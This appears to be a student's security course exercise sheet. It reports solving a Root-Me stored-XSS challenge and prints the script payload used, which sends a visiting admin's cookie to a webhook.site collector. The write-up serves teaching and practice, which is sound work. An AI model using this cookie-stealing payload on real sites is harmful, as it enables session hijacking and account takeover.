---
title: Exercise Sheet 01
tags:
  - Software-Security
  - Semester-5
  - Informatik
date: 2025-04-28
---
# Vulnerabilities and Access Control Implementation

> [!Example] Gruppe
> Mohammed Ali Al-Saiaf - 310320
> Nico Roth -
> Nokha Temarbulatov - 

---
## 1. Web Application Vulnerabilities (Without Time Constraints)

#### 1.2. Solve 2 of the challenges in the category Challenges => Web-Client that have a name starting with "XSS". \[Groups: 2 challenges per group member, e.g., 6 challenges for 3 persons\]

**Challenge 1:** [XSS - Stored - 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
we submitted the payload:
```html
<script>new Image().src="https://webhook.site/[id]?c="+document.cookie</script>
```
in the message field.
Because the input wasn’t sanitized, the script was saved and later executed when the "admin" visited the page. The script sent the admin’s cookie to a URL we created on **webhook.site**.

